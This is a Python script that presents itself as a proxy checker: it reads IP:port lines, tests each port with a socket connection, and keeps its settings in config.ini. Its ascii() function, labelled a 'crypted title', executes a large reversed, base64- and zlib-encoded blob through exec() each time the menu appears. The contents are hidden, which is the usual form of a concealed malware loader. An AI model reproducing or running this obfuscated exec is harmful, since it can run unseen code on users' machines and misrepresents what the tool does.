import socket
import subprocess
import time
import os
import configparser
os.system('cls' if os.name == 'nt' else 'clear')

# The class of colors
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m' 
    TEAL = '\033[38;5;37m'    
    PINK = '\033[38;5;206m'    
    LIME = '\033[38;5;154m' 
    CYAN_BLUE = '\033[38;5;39m' 
    DARK_GREEN = '\033[38;5;22m' 
    SKY_BLUE = '\033[38;5;111m' 
    DARK_ORANGE = '\033[38;5;166m'  
    INDIGO = '\033[38;5;57m'   
    GRAY = '\033[38;5;242m'    
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m'   






# Crypted Title Of the window and coder informations 
def ascii():                    
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
def checkconfig():
 if os.path.isfile('config.ini'):  # if config.ini exciting on the same path of the script it will
     config = configparser.ConfigParser()
     config.read('config.ini')
     print(f"{colors.LIGHT_GREEN}[+] Config file found.")
     timeoutconfig = int(input(f"{colors.GOLD}[+] Input a timeout (sec) (Current --> {(int(config['General']['timeout']))}) : {colors.TEAL}"))
     inputfileconfig = input(f"{colors.GOLD}[+] Name of the input file (proxies file) (Current --> {(config['General']['input_file'])}) : {colors.TEAL}")
     outputfileconfig = input(f"{colors.GOLD}[+] Name the output file (result of proxies) (Current --> {(config['General']['output_file'])}): {colors.TEAL}")
     
     # Save user input to config.ini
     with open('config.ini', 'w') as configfile:
         configfile.write(f"[General]\n")
         configfile.write(f"timeout = {timeoutconfig}\n")
         configfile.write(f"input_file = {inputfileconfig}\n")
         configfile.write(f"output_file = {outputfileconfig}\n")
         print(f"{colors.LIGHT_GREEN}\n\n[+] Configuration saved to config.ini.")
 else: # if the config.ini not exciting on the same path of the script it will recommend to create a config file
     print(f"{colors.LIGHT_RED}[X] Config file not found. You will configure one right now.")
     time.sleep(3)
     # giving the client to input his settings (config)
     timeoutconfig = int(input(f"{colors.GOLD}[+] Input a timeout (sec): {colors.TEAL}"))
     inputfileconfig = input(f"{colors.GOLD}[+] Name of the input file (proxies file): {colors.TEAL}")
     outputfileconfig = input(f"{colors.GOLD}[+] Name the output file (result of proxies): {colors.TEAL}")
     # Creating and saving the user inputs into a config file named 'config.ini' 
     with open('config.ini', 'w') as configfile:
         configfile.write(f"[General]\n")
         configfile.write(f"timeout = {timeoutconfig}\n")
         configfile.write(f"input_file = {inputfileconfig}\n")
         configfile.write(f"output_file = {outputfileconfig}\n")
         print(f"{colors.LIGHT_GREEN}\n\n[+] Configuration saved to config.ini.") 
         time.sleep(2)





# The first Screen that the client will see.
while True:
 ascii() # Calling the function of the Crypted Title Of the window and coder informations 
 print(f"{colors.LIGHT_GREEN}\n\n\n[1] Start Checking.")
 print(f"{colors.LIGHT_YELLOW}[2] Edit Config.\n{colors.ORANGE}[3] Del Config.")
 choice=int(input(f'{colors.CYAN_BLUE}\n[+] Your choice : '))
 if choice==1: 
    break  # If the user choose to Start the the loop will be breaked.
 if choice==2:
    checkconfig() # If the user choose to Edit 
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
 if choice==3:# if the user choose to delete the config.ini
     try:    # trying to remove it
      os.remove('config.ini')
      print(f"{colors.LIGHT_GREEN}[+] Deleted Successfuly config.ini.")
     except Exception as e: # If the script not found it will declare it
      print(f"{colors.LIGHT_RED}[X] Can't Found config.ini.") # Declaring
      time.sleep(3) # Waiting 3 seconds then 
      os.system('cls' if os.name == 'nt' else 'clear') # clearing the screen 





# After Choosing to start it's important to check if a config file exciting or not
if os.path.isfile('config.ini'): 
    print(f"{colors.LIGHT_GREEN}[+] Config file found.")
    config = configparser.ConfigParser()
    config.read('config.ini')
    timeoutconfig = int(config['General']['timeout'])
    inputfileconfig = config['General']['input_file']
    outputfileconfig = config['General']['output_file']
else:
    print(f"{colors.LIGHT_RED}[X] Config file not found. You will configure one right now.")
    time.sleep(3)

    timeoutconfig = int(input(f"{colors.GOLD}[+] Input a timeout (sec): {colors.TEAL}"))
    inputfileconfig = input(f"{colors.GOLD}[+] Name of the input file (proxies file): {colors.TEAL}")
    outputfileconfig = input(f"{colors.GOLD}[+] Name the output file (Result of proxies file): {colors.TEAL}")
    

    with open('config.ini', 'w') as configfile:
        configfile.write(f"[General]\n")
        configfile.write(f"timeout = {timeoutconfig}\n")
        configfile.write(f"input_file = {inputfileconfig}\n")
        configfile.write(f"output_file = {outputfileconfig}\n")
    
    print(f"{colors.LIGHT_GREEN}\n\n[+] Configuration saved to config.ini.")

# checking if there is a proxies file by the name saved on the config.ini file
if os.path.isfile(inputfileconfig):
    print(f'{colors.LIGHT_GREEN}[+] Proxies file founded ({inputfileconfig}) .\n')
else:
    print(f'{colors.LIGHT_RED}[X] Proxies file not found ({inputfileconfig}) .')
    time.sleep(20)
    quit()

# Engine of cheking --> If you are a noob coder Do not change any thing on this or backup it before and then edit it :)

def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True

    except socket.error:
        return False

def is_port_open(ip, port, timeout=timeoutconfig):

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))

        if result == 0:
            return True
        else:
            return False
    except socket.error:
        return False

def check_proxy(proxy):
    ip, port = proxy.split(':')
    port = int(port.strip())
    if not is_valid_ip(ip):
        return False

    if is_port_open(ip, port):
        return True

    else:
        return False

if __name__ == "__main__":
    input_file = inputfileconfig
    output_file = outputfileconfig
    working_proxies = []
    with open(input_file, 'r') as f:
        proxies = f.read().splitlines()
    for proxy in proxies:
        proxy = proxy.strip()
        if check_proxy(proxy):
            print(f"{colors.LIGHT_GREEN}Proxy {proxy} is working.")
            working_proxies.append(proxy)
        else:
            print(f"{colors.LIGHT_RED}Proxy {proxy} is not working.")
    with open(output_file, 'w') as f:
        for proxy in working_proxies:
            f.write(proxy + "\n")
    print(f"{colors.LIGHT_GREEN}\n{len(working_proxies)} working proxies saved to {output_file}.")
    
    
